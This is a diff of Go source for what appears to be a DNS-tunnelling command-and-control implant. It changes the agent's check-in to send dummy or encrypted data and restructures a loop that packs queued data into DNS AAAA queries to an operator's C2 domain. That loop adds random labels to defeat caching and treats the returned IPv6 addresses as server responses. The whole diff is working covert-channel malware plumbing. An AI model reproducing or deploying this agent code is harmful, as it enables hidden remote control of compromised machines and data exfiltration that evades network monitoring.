@@ -108,7 +108,17 @@ func (a *Agent) CheckIn() {
 			log.Printf("no data from proxy c2\n")
 		}
 	}
-	a.QueueData(AgentCommand_AGENT_CHECKIN, []byte{0xff}) //data will be ignored by server
+	// if we don't have a computed secret yet, we will send dummy data with our checkin
+	// this will be our first ping if the c2 doesn't know about us yet.
+	// c2 may error out trying to decrypt the dummy payload if an agent is already checked in
+	// the operator may choose to delete the agent and allow first ping again
+	if a.crypto.secret == nil {
+		log.Printf("checking in with dummy data (no secret computed yet)\n")
+		a.QueueData(AgentCommand_AGENT_CHECKIN, []byte{0xff})
+		return
+	}
+	log.Printf("checking in with encrypted data\n")
+	a.SendEncrypted(a.crypto.RandomBytes(6), AgentCommand_AGENT_CHECKIN)
 }
 
 // SendEncrypted will encrypt a message byte array and add it to the sendq
@@ -196,68 +206,69 @@ func (a *Agent) ProcessSendQ() {
 				a.CleanupSendQ(commandsSent[i])
 			}
 		}
-	} else {
-		for item := range a.sendq {
-			// first 4 bytes will be randomized for every request to prevent dns caching
-			antiCacheValue := a.crypto.RandomHexString(4)
-			query := antiCacheValue + "." + item + "." + a.config.C2Domain
+		return
+	}
 
-			// var err error
-			var c2Response []string
+	for item := range a.sendq {
+		// first 4 bytes will be randomized for every request to prevent dns caching
+		antiCacheValue := a.crypto.RandomHexString(4)
+		query := antiCacheValue + "." + item + "." + a.config.C2Domain
 
-			dnsMessage := new(dns.Msg)
-			dnsMessage.SetQuestion(query+".", dns.TypeAAAA)
-			dnsMessage.RecursionDesired = true
-			dnsClient := new(dns.Client)
-			dnsResponse, _, err := dnsClient.Exchange(dnsMessage, a.config.Resolver)
-			// log.Printf("raw: %s %s %s", in, rtt, err)
-			if err != nil {
-				// fmt.Printf("Error getting the IPv6 address: %s\n", err)
-			} else if dnsResponse.Rcode != dns.RcodeSuccess {
-				// fmt.Printf("Error getting the IPv6 address: %s\n", dns.RcodeToString[in.Rcode])
-			} else {
-				for _, record := range dnsResponse.Answer {
-					switch recordType := record.(type) {
-					case *dns.AAAA:
-						c2Response = append(c2Response, recordType.AAAA.String())
-					}
+		// var err error
+		var c2Response []string
+
+		dnsMessage := new(dns.Msg)
+		dnsMessage.SetQuestion(query+".", dns.TypeAAAA)
+		dnsMessage.RecursionDesired = true
+		dnsClient := new(dns.Client)
+		dnsResponse, _, err := dnsClient.Exchange(dnsMessage, a.config.Resolver)
+		// log.Printf("raw: %s %s %s", in, rtt, err)
+		if err != nil {
+			// fmt.Printf("Error getting the IPv6 address: %s\n", err)
+		} else if dnsResponse.Rcode != dns.RcodeSuccess {
+			// fmt.Printf("Error getting the IPv6 address: %s\n", dns.RcodeToString[in.Rcode])
+		} else {
+			for _, record := range dnsResponse.Answer {
+				switch recordType := record.(type) {
+				case *dns.AAAA:
+					c2Response = append(c2Response, recordType.AAAA.String())
 				}
 			}
-
-			// r := &net.Resolver{
-			// 	PreferGo: true,
-			// 	Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
-			// 		print(a.config.Resolver)
-			// 		d := net.Dialer{
-			// 			Timeout: time.Millisecond * time.Duration(10000),
-			// 		}
-			// 		// on Windows, custom resolvers do not work, it'll always use the OS resolver
-			// 		return d.DialContext(ctx, network, a.config.Resolver)
-			// 	},
-			// }
-			// ip, _ := r.LookupHost(context.Background(), query)
-			// log.Printf("ips: %s\n",ip[0])
-
-			if len(c2Response) > 0 {
-				// process response
-				log.Printf("c2 response for %q: %s\n", query, c2Response)
-				delete(a.sendq, item)
-				a.ProcessResponse(c2Response)
-			} else {
-				log.Printf("c2 response for: %q was empty\n", query)
-			}
-
-			// response, err = net.LookupHost(query)
-			// if err != nil {
-			// 	log.Printf("error looking up %q (err: %q)\n", query, err)
-			// }
-			// if response != nil {
-			// 	// process response
-			// 	log.Printf("c2 response for %q: %s\n", query, response)
-			// 	delete(a.sendq, item)
-			// 	a.ProcessResponse(response)
-			// }
 		}
+
+		// r := &net.Resolver{
+		// 	PreferGo: true,
+		// 	Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+		// 		print(a.config.Resolver)
+		// 		d := net.Dialer{
+		// 			Timeout: time.Millisecond * time.Duration(10000),
+		// 		}
+		// 		// on Windows, custom resolvers do not work, it'll always use the OS resolver
+		// 		return d.DialContext(ctx, network, a.config.Resolver)
+		// 	},
+		// }
+		// ip, _ := r.LookupHost(context.Background(), query)
+		// log.Printf("ips: %s\n",ip[0])
+
+		if len(c2Response) > 0 {
+			// process response
+			log.Printf("c2 response for %q: %s\n", query, c2Response)
+			delete(a.sendq, item)
+			a.ProcessResponse(c2Response)
+		} else {
+			log.Printf("c2 response for: %q was empty\n", query)
+		}
+
+		// response, err = net.LookupHost(query)
+		// if err != nil {
+		// 	log.Printf("error looking up %q (err: %q)\n", query, err)
+		// }
+		// if response != nil {
+		// 	// process response
+		// 	log.Printf("c2 response for %q: %s\n", query, response)
+		// 	delete(a.sendq, item)
+		// 	a.ProcessResponse(response)
+		// }
 	}
 }
 
